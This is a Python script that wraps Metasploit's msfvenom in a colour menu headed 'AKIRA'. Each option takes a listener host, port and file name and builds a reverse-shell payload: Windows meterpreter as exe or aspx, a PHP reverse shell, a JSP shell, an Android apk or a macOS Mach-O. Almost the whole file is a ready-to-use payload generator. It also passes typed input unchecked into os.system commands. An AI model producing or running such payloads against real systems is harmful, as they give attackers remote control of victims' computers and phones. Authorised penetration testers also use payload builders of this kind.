import os

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    ESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"

def msfvenom():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.CRIMSON + """
 ███▄ ▄███▓  ██████   █████▒██▒   █▓▓█████  ███▄    █  ▒█████   ███▄ ▄███▓
▓██▒▀█▀ ██▒▒██    ▒ ▓██   ▒▓██░   █▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▓██▒▀█▀ ██▒
▓██    ▓██░░ ▓██▄   ▒████ ░ ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██    ▓██░
▒██    ▒██   ▒   ██▒░▓█▒  ░  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▒██    ▒██ 
▒██▒   ░██▒▒██████▒▒░▒█░      ▒▀█░  ░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒   ░██▒
░ ▒░   ░  ░▒ ▒▓▒ ▒ ░ ▒ ░      ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░
░  ░      ░░ ░▒  ░ ░ ░        ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░  ░      ░
░      ░   ░  ░  ░   ░ ░        ░░     ░      ░   ░ ░ ░ ░ ░ ▒  ░      ░   
       ░         ░               ░     ░  ░         ░     ░ ░         ░   
                                ░                                         

-- version 1.0 -- 
-- enjoy --
-- :) --

[1] UPDATE MSFVENOM       [6] ANDROID REVERSE_TCP                              
[2] REVERSE_TCP           [7] MACOS REVERSE_TCP         
[3] PHP                    [4] JSP
[5] ASPX
          """)

    while True:
        select = input(TextColors.CRIMSON + "AKIRA > " + TextColors.ESET)

        if select == "1":
            os.system("msfupdate")
                
        if select == "2":
            LHOST = input(TextColors.CRIMSON + "ENTER THE LHOST : " + TextColors.ESET)
            LPORT = input(TextColors.CRIMSON + "ENTER THE LPORT : " + TextColors.ESET)
            NAME = input(TextColors.CRIMSON + "ENTER THE PAYLOAD NAME (exe) : " + TextColors.ESET)

            command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {NAME}"
            os.system(command)
            print(TextColors.CYAN + f"[+] SUCCESSFULLY EXECUTED : {NAME}")
                
        if select == "3":
            LHOST = input("ENTER THE LHOST : ")
            LPORT = input("ENTER THE LPORT : ")
            NAME = input("ENTER THE PAYLOAD NAME (.php) : ")

            command = f"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -o {NAME}"
            os.system(command)
            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")  

        if select == "4":
            LHOST = input("ENTER THE LHOST : ")
            LPORT = input("ENTER THE LPORT : ")
            NAME = input("ENTER THE PAYLOAD NAME (.jsp) : ")

            command = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o {NAME}"
            os.system(command)
            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")
                         
        if select == "5":
            LHOST = input("ENTER THE LHOST : ")
            LPORT = input("ENTER THE LPORT : ")
            NAME = input("ENTER THE PAYLOAD NAME (.aspx) : ")

            command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o {NAME}"
            os.system(command)
            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")
                           
        if select == "6":
            LHOST = input("ENTER THE LHOST : ")
            LPORT = input("ENTER THE LPORT : ")
            NAME = input("ENTER THE PAYLOAD NAME (.apk) : ")

            command = f"msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {NAME}"
            os.system(command)
            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")

        if select == "7":
            LHOST = input("ENTER THE LHOST : ")
            LPORT = input("ENTER THE LPORT : ")
            NAME = input("ENTER THE PAYLOAD NAME (.macho) : ")

            command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o {NAME}"
            os.system(command)
            print(f"[+] SUCCESSFULLY EXECUTED : {NAME}")
